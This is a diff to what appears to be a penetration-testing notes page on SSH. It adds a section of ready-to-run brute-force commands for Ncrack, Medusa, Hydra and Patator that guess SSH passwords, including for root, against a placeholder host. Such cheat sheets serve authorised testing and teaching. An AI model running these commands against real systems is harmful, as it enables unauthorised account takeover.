@@ -12,6 +12,35 @@ In the connection setup phase, the SSH server authenticates itself to the client
 
 After a successful authentication the server provides the client access to the host system. This access is governed with the user account permissions at the target host system.
 
+
+# Bruteforcing Credentials
+
+To bruteforce the login in order to find valid credentials we can use different tools:
+
+* Ncrack
+```
+ncrack -U usernames.txt -P passowrds.txt ssh://10.10.10.10 -v
+ncrack -u root -P passowrds.txt ssh://10.10.10.10 -v
+```
+
+* Medusa
+```
+medusa -h 10.10.10.10 -U usernames.txt -P passowrds.txt -M ssh
+medusa -h 10.10.10.10 -u root -P passowrds.txt -M ssh
+```
+
+* Hydra
+```
+hydra -L usernames.txt -P passwords.txt ssh://10.10.10.10 -s 22
+hydra -l root -P passwords.txt ssh://10.10.10.10 -s 22
+```
+
+* Patator
+```
+patator ssh_login host=10.10.10.10 user=FILE0 password=FILE1 0=users.txt  1=pass.txt -x ignore:mesg='Authentication failed'
+patator ssh_login host=10.10.10.10 user=root password=FILE0 0=pass.txt -x ignore:mesg='Authentication failed'
+```
+
 # Donwload Files
 
 To download files we can use `sftp` or `scp`:
